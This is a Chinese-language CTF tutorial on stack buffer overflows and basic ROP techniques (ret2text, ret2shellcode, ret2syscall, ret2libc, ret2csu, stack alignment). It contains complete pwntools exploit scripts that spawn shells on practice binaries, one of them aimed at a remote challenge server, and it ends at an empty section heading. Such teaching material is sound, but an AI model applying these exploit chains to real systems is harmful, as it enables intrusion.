# 栈溢出-基本ROP

Author: H3rmesk1t

Data: 2022-2-13

# 栈介绍
## 基本栈介绍
栈是一种后进先出(LIFO)的数据结构, 只有入栈(push)和出栈(pop)两种操作. 每个程序在运行的过程中都存在虚拟地址空间, 其中某一部分就是该程序对应的栈, 用于保存函数调用信息和局部变量. 需要注意的是, 程序的栈是从进程地址空间的高地址向低地址增长的.

<div align=center><img src="./images/1.png"></div>

## 函数调用栈
在程序的运行期间, 内存中有一块用来实现程序的函数调用机制的区域, 该区域是一块`LIFO`的数据结构区域, 我们通常叫其函数栈. 每个未退出的函数都会在函数栈中拥有一块数据区, 即函数的栈帧. 函数的调用栈帧中, 保存了相应的函数的一些重要信息: 函数中使用的局部变量、函数的参数, 另外还有一些维护函数栈所需要的数据, 比如`EBP`指针(指向“父函数”的调用栈帧), 函数的返回地址等.


这里通过调试代码来理解一下, 示例代码如下:

```c++
#include <iostream>

int add(int num) {
    int temp = 2;
    return num + temp;
}

int main() {
    int num = 1;
    std::cout << add(num) << std::endl;
    return 0;
}
```

<div align=center><img src="./images/2.png"></div>

<div align=center><img src="./images/3.png"></div>

这里给出一张寄存器的图, 需要注意的是, `32`位和`64`位程序存在一定的区别:
 - x86
    - 函数参数在函数返回地址上.
 - x64: 
    - 内存地址不能大于`0x00007FFFFFFFFFFF`, `6`个字节长度,否则会抛出异常.
    - `System V AMD64 ABI`(Linux、FreeBSD、macOS等采用)中前六个整型或指针参数依次保存在`RDI`, `RSI`, `RDX`, `RCX`, `R8`和`R9`寄存器中, 如果还有更多的参数的话才会保存在栈上.

<div align=center><img src="./images/4.png"></div>

其中, 常见寄存器有:
 - 数据寄存器: EAX(累加器), EBX(基地址寄存器), ECX(计数器), EDX(用来放整数除法产生的余数)
 - 变址和指针寄存器: ESI(源索引寄存器), EDI(目标索引寄存器)
 - 指针寄存器: ESP(栈指针寄存器-其内存放着一个指针永远指向系统栈最上面一个栈帧的栈顶), EBP(基址指针寄存器-其内存放着一个指针永远指向系统栈最上面一个栈帧的底部)


# 栈溢出原理
## 介绍
栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数, 因而导致与其相邻的栈中的变量的值被改变. 这种问题是一种特定的缓冲区溢出漏洞, 类似的还有堆溢出, `bss`段溢出等溢出方式. 栈溢出漏洞轻则可以使程序崩溃, 重则可以使攻击者控制程序执行流程. 

此外, 发生栈溢出的基本前提是:
 - 程序必须向栈上写入数据.
 - 程序向栈上写入的数据大小未能被很好的控制.

## 示例
在栈溢出漏洞中, 最典型的漏洞利用方式是覆盖程序的返回地址为攻击者所控制的地址, 当然, 这个地址所在的段是必须有可执行权限的. 下面用一个简单的例子来进行说明, 示例代码如下:

```c++
#include<stdio.h>
#include<string.h>

void success() {
	puts("Successfully, you have already controlled this system!");
	system("/bin/bash");
}

void vulnerable() {
	char data[10];
	gets(data);
	puts(data);
	return;
}

int main(int argc, char **argv) {
	vulnerable();
	return 0;
}
```

上述程序的主要目的读取一个字符串并将其输出, 而我们则希望可以控制程序执行`success`函数. 编译示例代码:

```bash
gcc -m32 -fno-stack-protector -no-pie example.c -o example

explanation:
    -m32: 生成32位程序.
    -fno-stack-protector: 不开启堆栈溢出保护, 即不生成canary.
    -no-pie: 避免加载基址被打乱, 不同gcc版本对于PIE的默认配置不同, 可通过命令gcc -v来查看默认的开关情况.
```

<div align=center><img src="./images/5.png"></div>

在上面的编译结果中可以看到`gets`本身是一个危险函数(从不检查输入字符串的长度, 而是以回车来判断输入是否结束), 因此很容易导致栈溢出现象出现.

上文提到编译时的`PIE`保护, 其实在`Linux`平台下还有地址空间分布随机化(ASLR)的机制. 即使可执行文件开启了`PIE`保护, 还需要系统开启`ASLR`才会真正打乱基址, 否则程序运行时依旧会在加载一个固定的基址上(不过和No PIE时基址不同). 可以通过修改`/proc/sys/kernel/randomize_va_space`来控制`ASLR`启动与否, 具体选项为:
 1. 关闭`ASLR`. 没有随机化, 栈、堆、`.so`的基地址每次都相同.
 2. 普通的`ASLR`. 栈基地址、`mmap`基地址、`.so`加载基地址都将被随机化, 但是堆基地址没有随机化.
 3. 增强的`ASLR`. 在普通`ASLR`的基础上增加了堆基地址随机化.

根据上文的选项讲解, 可以使用`echo 0 > /proc/sys/kernel/randomize_va_space`关闭`Linux`系统的`ASLR`, 类似的也可以配置相应的参数.

编译成功后, 使用工具`checksec`来检查编译出的文件, 可以看到栈溢出和`PIE`保护都是关闭的.

<div align=center><img src="./images/6.png"></div>

利用`IDA`来反编译一下二进制程序并查看`vulnerable`函数.

<div align=center><img src="./images/7.png"></div>

在`vulnerable`函数中, 该字符串距离`ebp`的长度为`0x12`, 那么相应的栈结构为:

```text
                                        +-----------------+
                                        |     retaddr     |
                                        +-----------------+
                                        |     saved ebp   |
                                ebp--->+-----------------+
                                        |                 |
                                        |                 |
                                        |                 |
                                        |                 |
                                        |                 |
                                        |                 |
                        data,ebp-0x16-->+-----------------+
```

并且, 我们可以通过`IDA`获得`success`的地址, 其地址为`0x080491B6`.

<div align=center><img src="./images/8.png"></div>

那么如果我们读取的字符串为`0x12*'a'+'bbbb'+success_addr`, 由于`gets`会读到回车才算结束, 所以我们可以直接读取所有的字符串, 并且将`saved ebp`覆盖为`bbbb`, 将`retaddr`覆盖为`success_addr`, 此时的栈结构为:

```text
                                        +-----------------+
                                        |    0x080491B6   |
                                        +-----------------+
                                        |       bbbb      |
                                ebp--->+-----------------+
                                        |                 |
                                        |                 |
                                        |                 |
                                        |                 |
                                        |                 |
                                        |                 |
                        data,ebp-0x16-->+-----------------+
```

根据上文的分析, 即可开始构造相应的`exploit`了. 这里需要注意的一点是, 在计算机内存中每个值都是按照字节存储的. 一般情况下都是采用小端存储, 即`0x080491B6`在内存中的形式是`\xb6\x91\x04\x08`. `exploit`如下:

```python
# coding=utf-8
from pwn import *

# 构造与程序交互的对象
p = process('./example')
success_addr = 0x080491B6

# 构造Payload
# payload = 'a' * 0x16 + p32(success_addr)
payload = 'a' * 0x12 + 'bbbb' + p32(success_addr)

# 发送Payload
p.sendline(payload)

# 代码交互转为手工交互
p.interactive()
```

执行`exploit`, 可以看到成功执行到了`success`函数.

<div align=center><img src="./images/9.png"></div>

## 总结
### 寻找危险函数
通过寻找危险函数, 可以快速确定程序是否可能存在栈溢出, 以及存在的话, 栈溢出的位置在哪里. 常见的危险函数如下:
 - 输入
   - gets
   - scanf
   - vscanf
 - 输出
   - sprintf
 - 字符串
   - strcpy
   - strcat
   - bcopy

### 确定填充长度
这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离. 常见的操作方法就是打开`IDA`, 根据其给定的地址计算偏移.

一般来说, 变量会有以下几种索引模式:
 - 相对于栈基地址的的索引, 可以直接通过查看`EBP`相对偏移获得.
 - 相对应栈顶指针的索引, 一般需要进行调试, 之后还是会转换到第一种类型.
 - 直接地址索引, 就相当于直接给定了地址.

一般来说, 会有如下的覆盖需求:
 - 覆盖函数返回地址, 这时候就是直接看`EBP`即可.
 - 覆盖栈上某个变量的内容.
 - 覆盖`bss`段某个变量的内容.
 - 根据现实执行情况, 覆盖特定的变量或地址的内容.

# 基本ROP
随着`NX`保护的开启, 以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果. 攻击者们也提出来相应的方法来绕过保护, 目前主要的是`ROP`(Return Oriented Programming), 其主要思想是在栈缓冲区溢出的基础上, 利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值, 从而控制程序的执行流程. 所谓`gadgets`就是以`ret`结尾的指令序列, 通过这些指令序列, 我们可以修改某些地址的内容, 方便控制程序的执行流程.

之所以称之为`ROP`, 是因为核心在于利用了指令集中的`ret`指令, 改变了指令流的执行顺序. `ROP`攻击一般得满足如下条件:
 - 程序存在溢出, 并且可以控制返回地址.
 - 可以找到满足条件的`gadgets`以及相应`gadgets`的地址.

如果`gadgets`每次的地址是不固定的, 那我们就需要想办法动态获取对应的地址了.

## ret2text
### 原理
`ret2text`即控制程序执行程序本身已有的的代码(.text). 其实这种攻击方法是一种笼统的描述, 我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是`gadgets`), 这就是我们所要说的`ROP`. 这时, 我们需要知道对应返回的代码的位置, 当然程序也可能会开启某些保护, 我们需要想办法去绕过这些保护.

### 例子
程序下载链接: [ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text).

首先, 查看一下程序的保护机制. 可以看到这是一个`32`位程序, 并且开起了栈不可执行保护.

<div align=center><img src="./images/10.png"></div>

使用`IDA`来查看源代码, 程序在主函数中使用了`gets`函数, 显然存在栈溢出漏洞.

<div align=center><img src="./images/11.png"></div>

在`secure`函数又发现了存在调用`system("/bin/sh")`的代码. 到此, 攻击逻辑基本就清楚了, 我们直接控制程序返回至`0x0804863A`, 那么就可以得到系统的`shell`了.

<div align=center><img src="./images/12.png"></div>

下面就是确定填充长度来构造`payload`的问题了, 首先需要确定的是我们能够控制的内存的起始地址距离`main`函数的返回地址的字节数.

<div align=center><img src="./images/13.png"></div>

可以看到该字符串是通过相对于`esp`的索引, 所以我们需要进行调试, 将断点下在`call`处, 查看`esp`, `ebp`.

<div align=center><img src="./images/14.png"></div>

可以看到`esp`为`0xff805d70`, `ebp`为`0xff805df8`, 同时`s`相对于`esp`的索引为`esp+0x1c`, 因此我们可以推断:
 - `s`的地址为`0xff805d8c`
 - `s`相对于`ebp`的偏移为`0xff805df8-0xff805d8c`, 即`0x6c`.

`exploit`如下:

```python
# coding=utf-8
from pwn import *

sh = process('./ret2text')
shell_addr = 0x0804863A
payload = 'a' * (0x6c+4) + p32(shell_addr)
sh.sendline(payload)
sh.interactive()
```

<div align=center><img src="./images/15.png"></div>

## ret2shellcode
### 原理
`ret2shellcode`即控制程序执行`shellcode`代码. `shellcode`指的是用于完成某个功能的汇编代码, 常见的功能主要是获取目标系统的`shell`. 一般来说, `shellcode`需要我们自己填充. 这其实是另外一种典型的利用方法, 此时我们需要自己去填充一些可执行的代码.

在栈溢出的基础上, 要想执行`shellcode`, 需要对应的`binary`在运行时, `shellcode`所在的区域具有可执行权限.

### 例子
程序下载链接: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode).

首先, 查看一下程序的保护机制. 可以看到这是一个`32`位程序, 源程序几乎没有开启任何保护, 并且有可读, 可写, 可执行段.

<div align=center><img src="./images/16.png"></div>

使用`IDA`来查看源代码, 程序仍然是基本的栈溢出漏洞, 不过这次还同时将对应的字符串复制到`buf2`处, 简单查看可知`buf2`在`bss`段.

<div align=center><img src="./images/17.png"></div>

<div align=center><img src="./images/18.png"></div>

这时, 我们简单的调试下程序, 看看这一个`bss`段是否可执行. 通过`vmmap`, 我们可以看到`bss`段对应的段具有可执行权限.

<div align=center><img src="./images/19.png"></div>

那么这次我们就控制程序执行`shellcode`, 也就是读入`shellcode`, 然后控制程序执行`bss`段处的`shellcode`.

<div align=center><img src="./images/20.png"></div>

`exploit`如下:

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
sh.interactive()
```

## ret2syscall
### 原理
`ret2syscall`, 即控制程序执行系统调用来获取`shell`. 

系统调用:
 - 操作系统提供给用户的编程接口.
 - 是提供访问操作系统所管理的底层硬件的接口.
 - 本质上是一些内核函数代码, 以规范的方式驱动硬件.
 - `x86`通过`int 0x80`指令进行系统调用、`amd64`通过`syscall`指令进行系统调用`mov eax, 0xb mov ebx, ["/bin/sh"] mov ecx, 0 mov edx, 0 int 0x80 => execve("/bin/sh",NULL,NULL)`.

<div align=center><img src="./images/21.jpeg"></div>

### 例子
程序下载链接: [ret2syscall](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop).

首先, 查看一下程序的保护机制. 可以看到这是一个`32`位程序, 开起了`NX`保护.

<div align=center><img src="./images/22.png"></div>

使用`IDA`来查看源代码, 可以看出此次仍然是一个栈溢出. 类似于之前的做法, 可以获得`v4`相对于`ebp`的偏移为`108`, 所以需要覆盖的返回地址相对于`v4`的偏移为`112`. 由于不能直接利用程序中的某一段代码或者自己填写代码来获得`shell`, 所以利用程序中的`gadgets`来获得`shell`, 而对应的`shell`获取则是利用系统调用. [系统调用的知识](https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8).

<div align=center><img src="./images/27.png"></div>

简单地说, 只要把对应获取`shell`的系统调用的参数放到对应的寄存器中, 那么在执行`int 0x80`就可执行对应的系统调用. 比如说这里利用如下系统调用来获取`shell`: `execve("/bin/sh",NULL,NULL)`

其中, 该程序是`32`位, 所以需要使得:
 - 系统调用号, 即`eax`应该为`0xb`.
 - 第一个参数, 即`ebx`应该指向`/bin/sh`的地址, 其实执行`sh`的地址也可以.
 - 第二个参数, 即`ecx`应该为`0`.
 - 第三个参数, 即`edx`应该为`0`.

这里解释一下为啥`eax`传参是`0xb`. 在`execve.c`文件中`execve`被这样定义`_syscall3(int,execve,const char *,file,char **,argv,char **,envp)`, 其中`_syscall3`是一个宏, 将其展开后如下:

```c++
int execve(const char * file,char ** argv,char ** envp) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
	: "=a" (__res) \
	: "0" (__NR_execve),"b" ((long)(file)),"c" ((long)(argv)),"d" ((long)(envp))); \
if (__res>=0) \
	return (int) __res; \
errno=-__res; \
return -1; \
}
```

可以看到`execve`本质是系统调用`int 0x80`(类似于软中断的触发), 系统调用号为`__NR_execve`赋值在`eax`当中, 传入的参数分别为`file`、`argv`、`envp`由`ebx`、`ecx`、`edx`寄存器分别传入. 而`__NR_execve`在`/usr/include/asm/unistd_32.h`或者`/usr/include/asm/unistd_64.h`中定义, 值分别为`11`和`59`, 是`sys_call_table`的索引值(用于找到该表中对应的系统调用函数sys_execve).

<div align=center><img src="./images/28.png"></div>

具体寻找`gadgets`的方法, 可以使用[ropgadgets](https://github.com/JonathanSalwan/ROPgadget)这个工具.

首先, 我们来寻找控制`eax`的`gadgets`, 可以看到下图中有几个都可以控制`eax`, 这里选取第二个来作为`gadgets`.

<div align=center><img src="./images/23.png"></div>

接着来寻找`ebx`的`gadgets`, 可以看到在下图中标记的`gadgets`同时可以直接控制`ebx`, `ecx`, `edx`三个寄存器.

<div align=center><img src="./images/24.png"></div>

接着需要获得`/bin/sh`字符串对应的地址.

<div align=center><img src="./images/25.png"></div>

最后获取`int 0x80`的地址.

<div align=center><img src="./images/26.png"></div>

`exploit`如下:

```python
# coding=utf-8
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x080be408

# flat模块能将pattern字符串和地址结合并且转为字节模式
payload = flat(['a' * 0x70, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
```

<div align=center><img src="./images/29.png"></div>

## ret2libc
### 原理
`ret2libc`即控制函数的执行`libc`中的函数, 通常是返回至某个函数的`plt`处或者函数的具体位置(即函数对应的`got`表项的内容). 一般情况下, 我们会选择执行`system("/bin/sh")`, 故而此时我们需要知道`system`函数的地址.

### 例子1
程序下载链接: [ret2libc1](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1).

源程序为`32`位, 开启了`NX`保护.

<div align=center><img src="./images/30.png"></div>

用`IDA`查看, 可以看到在执行`gets`函数的时候出现了栈溢出.

<div align=center><img src="./images/31.png"></div>

利用`ropgadget`, 可以查看是否有`/bin/sh`存在.

<div align=center><img src="./images/32.png"></div>

查找一下是否有`system`函数存在.

<div align=center><img src="./images/33.png"></div>

由于存在`system`函数, 因此直接返回该处执行`system`函数即可. 这里我们需要注意函数调用栈的结构, 如果是正常调用`system`函数, 我们调用的时候会有一个对应的返回地址, 这里以`bbbb`作为虚假的地址, 其后参数对应的参数内容. `exploit`如下:

```python
# coding=utf-8
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460

# flat模块能将pattern字符串和地址结合并且转为字节模式
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])

sh.sendline(payload)
sh.interactive()
```

<div align=center><img src="./images/34.png"></div>

### 例子2
程序下载链接: [ret2libc2](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2).

该题目与`例子1`基本一致, 只不过不再出现`/bin/sh`字符串, 所以此次需要我们自己来读取字符串, 需要两个`gadgets`. 第一个控制程序读取字符串, 第二个控制程序执行`system("/bin/sh")`. 由于漏洞与上述一致, `exploit`如下:

```python
# coding=utf-8
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x8048460
pop_ebx = 0x0804843d
system_plt = 0x8048490
buf2 = 0x804A080


# flat模块能将pattern字符串和地址结合并且转为字节模式
# payload1 = flat(["a"*112,gets,pop,buf2,system,"aaaa",buf2])
payload2 = flat(['a' * 112, gets_plt, system_plt, buf2, buf2])

sh.sendline(payload2)
sh.sendline('/bin/sh')
sh.interactive()
```

<div align=center><img src="./images/35.png"></div>

### 例子3
程序下载链接: [ret2libc3](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3).

在`例子2`的基础上, 再次将`system`函数的地址去掉. 此时需要同时找到`system`函数地址与`/bin/sh`字符串的地址.

在得到`system`函数的地址的过程中主要利用了两个知识点:
 - `system`函数属于`libc`, 而`libc.so`动态链接库中的函数之间相对偏移是固定的.
 - 即使程序有`ASLR`保护, 也只是针对于地址中间位进行随机, 最低的`12`位并不会发生改变. [libc搜集](https://github.com/niklasb/libc-database)

因此, 当我们知道`libc`中某个函数的地址时, 就可以确定该程序利用的`libc`. 进而就可以知道`system`函数的地址. 对于得到`libc`中的某个函数的地址, 我们一般常用的方法是采用`got`表泄露, 即输出某个函数对应的`got`表项的内容. 由于`libc`的延迟绑定机制, 我们需要泄漏已经执行过的函数的地址. 根据上面的步骤得到`libc`后, 在程序中查询偏移, 然后再次获取`system`地址, 除了手动操作的方式, 这里给出一个`libc`的利用工具——[LibcSearcher](https://github.com/lieanu/LibcSearcher). `libc`中也是有`/bin/sh`字符串的, 在得到`libc`之后, 我们可以一起获得`/bin/sh`字符串的地址.

对于这道题, 我们采用泄露`__libc_start_main`地址的方式, 这是因为它是程序最初被执行的地方. 基本利用思路如下:
 - 泄露`__libc_start_main`地址.
 - 获取`libc`版本.
 - 获取`system`地址与`/bin/sh`的地址.
 - 再次执行源程序, 触发栈溢出执行`system('/bin/sh')`.

`exploit`如下:

```python
# coding=utf-8
from pwn import *
from LibcSearcher import *

sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')
puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

print "leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)

print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print "get shell"
payload = flat(['A' * 104, system_addr, 'aaaa', binsh_addr])
sh.sendline(payload)

sh.interactive()
```

<div align=center><img src="./images/36.png"></div>

## ret2csu
### 原理
在`64`位程序中, 函数的前`6`个参数是通过寄存器传递的, 但是大多数时候很难找到每一个寄存器对应的`gadgets`. 这时候我们可以利用`x64`下的`__libc_csu_init`中的`gadgets`. 这个函数是用来对`libc`进行初始化操作的, 而一般的程序都会调用`libc`函数, 所以这个函数一定会存在. 我们先来看一下这个函数(不同版本的这个函数有一定的区别):

```c++
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16 o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54 j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34 j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp
```

这里我们可以利用以下几点:
 - 从`0x000000000040061A`一直到结尾, 可以利用栈溢出构造栈上数据来控制`rbx`, `rbp`, `r12`, `r13`, `r14`, `r15`寄存器的数据.
 - 从`0x0000000000400600`到`0x0000000000400609`, 可以将`r13`赋给`rdx`, 将`r14`赋给`rsi`, 将`r15d`赋给`edi`(虽然这里赋给的是`edi`, 但其实此时`rdi`的高`32`位寄存器值为`0`, 所以其实我们可以控制`rdi`寄存器的值, 只不过只能控制低`32`位), 而这三个寄存器, 也是`x64`函数调用中传递的前三个寄存器. 此外, 如果我们可以合理地控制`r12`与`rbx`, 那么我们就可以调用我们想要调用的函数. 比如说我们可以控制`rbx`为`0`, `r12`为存储我们想要调用的函数的地址.
 - 从`0x000000000040060D`到`0x0000000000400614`, 我们可以控制`rbx`与`rbp`的之间的关系为`rbx+1 = rbp`, 这样就不会执行`loc_400600`, 进而可以继续执行下面的汇编程序. 这里可以简单的设置为: `rbx=0`, `rbp=1`.

### 例子
程序下载链接: [ret2csu](https://github.com/zhengmin1989/ROP_STEP_BY_STEP/raw/master/linux_x64/level5).

先`checksec`查看一下程序, 程序为`64`位, 开启了堆栈不可执行保护.

<div align=center><img src="./images/37.png"></div>

`IDA`查看程序, 跟进`vulnerable_function`函数, 可以看到程序存在一个栈溢出的漏洞点. 并且在程序中既没有`system`函数地址, 也没有`/bin/sh`字符串, 需要我们自己去构造.

<div align=center><img src="./images/38.png"></div>

这里使用的是`execve`来获取`shell`, 基本利用思路如下:
 - 利用栈溢出执行`libc_csu_gadgets`获取`write`函数地址, 并使得程序重新执行`main`函数.
 - 根据`libcsearcher`获取对应`libc`版本以及`execve`函数地址.
 - 再次利用栈溢出执行`libc_csu_gadgets`向`bss`段写入`execve`地址以及`'/bin/sh'`地址, 并使得程序重新执行`main`函数.
 - 再次利用栈溢出执行`libc_csu_gadgets`执行`execve('/bin/sh')`获取`shell`.

`exploit`参考`CTF Wiki`:

```python
from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)

## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```



# 技巧
## ubuntu18 及以上系统 64 位的堆栈平衡问题
### 前言
在`Ubuntu18`及以上的版本, `64`位的程序若包含了`system('/bin/sh')`, 则需要考虑堆栈平衡问题. 因为在`Ubuntu18`下的版本中`system`调用时要求地址和`16`字节对齐, 如果没有栈对齐的话, 程序就直接`crash`了.

### 原因
栈的字节对齐, 实际是指栈顶指针必须是`16`字节的整数倍. 栈对齐使得在尽可能少的内存访问周期内读取数据, 不对齐堆栈指针可能导致严重的性能下降. 但是实际上, 即使数据没有对齐, 我们的程序也是可以执行的, 只是效率有点低而已, 但是某些型号的`Intel`和`AMD`处理器在执行某些实现多媒体操作的`SSE`指令时, 如果数据没有对齐, 将无法正确执行. 这些指令对`16`字节内存进行操作, 在`SSE`单元和内存之间传送数据的指令要求内存地址必须是`16`的倍数.

因此, 任何针对`x86_64`处理器的编译器和运行时系统都必须保证它们分配内存将来可能会被`SSE`指令使用, 所以必须是`16`字节对齐的, 这也就形成了一种标准:
 - 任何内存分配函数(alloca, malloc, calloc 或 realloc)生成的块的起始地址都必须是`16`的倍数.
 - 大多数函数的栈帧的边界都必须是`16`字节的倍数.

因此, 在运行时栈中不仅传递的参数和局部变量要满足字节对齐, 栈指针(rsp)也必须是`16`的倍数.

### 例题讲解
这里用`ciscn_2019_c_1`来讲解一下这个知识点. 在最后`getshell`时我们需要用到`system`函数, 但是由于给的环境是`ubuntu18`的, 因此这个函数需要满足栈对齐的条件. 

此时可以有两个方法来解决这一问题:
 1. 尝试通过`p64(ret_addr)`来栈对齐
 2. 放弃使用`system`而利用`execve`, 但坏处是在`64`位环境下需要`3`个寄存器来构造参数.

在这道题中是`64`位程序, 如果要构建`ROPgadget`, 不一定能同时找到三个寄存器的语句, 因此这个方法就不一定能行得通. 要想栈对齐, 最好使用`ret`.

可以看到此时`0x79`加上结尾`\x00`也就是`0x80`能被`0x10`, 也就是`16`整除, 栈对齐.

<div align=center><img src="./images/39.png"></div>

`exploit`如下:

```python
from pwn import *
from LibcSearcher import *

content = 1
context(os='linux', arch='amd64', log_level='debug')

remote_env = 'node4.buuoj.cn:28141'
local_env = './ciscn_2019_c_1'

elf = ELF(local_env)
ret_addr = 0x00000000004006b9
pop_rdi_addr = 0x0000000000400c83

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

log.success('puts_plt = ' + hex(puts_plt))
log.success('puts_got = ' + hex(puts_got))
log.success('main_addr = ' + hex(main_addr))

if content:
    sh = remote(remote_env.split(':')[0], int(remote_env.split(':')[1]))
else:
    sh = process(local_env)

payload_leak_libc = '\0' + 'a' * (0x50 + 7)
payload_leak_libc += p64(pop_rdi_addr)
payload_leak_libc += p64(puts_got)
payload_leak_libc += p64(puts_plt)
payload_leak_libc += p64(main_addr)

sh.sendlineafter('Input your choice!\n', '1')
sh.sendlineafter('Input your Plaintext to be encrypted\n', payload_leak_libc)
sh.recvuntil('Ciphertext\n')
sh.recvuntil('\n')

puts_addr = u64(sh.recvuntil('\n', drop=True).ljust(8, '\x00'))
log.success('puts_addr = ' + hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)
libc_base_addr = puts_addr - libc.dump('puts')
binsh_addr = libc_base_addr + libc.dump('str_bin_sh')
system_addr = libc_base_addr + libc.dump('system')

log.success('libc_base_addr = ' + hex(libc_base_addr))
log.success('binsh_addr = ' + hex(binsh_addr))
log.success('system_addr = ' + hex(system_addr))

payload_attack = '\0' + 'a' * (0x50 + 7)
payload_attack += p64(ret_addr)
payload_attack += p64(pop_rdi_addr)
payload_attack += p64(binsh_addr)
payload_attack += p64(system_addr)

sh.sendlineafter('Input your choice!\n', '1')
sh.sendlineafter('Input your Plaintext to be encrypted\n', payload_attack)

sh.interactive()
```

<div align=center><img src="./images/40.png"></div>

## 内存的权限修改问题
### 思路
使用`mprotec`函数修改内存的权限为可读可写可执行, 然后在该内存中写入自己的`shellcode`, 执行该代码即可. `mprotect`函数原型如下:

```c++
int mprotect(void *addr, size_t len, int prot);
addr 内存启始地址
len  修改内存的长度
prot 内存的权限
```

### 例题讲解
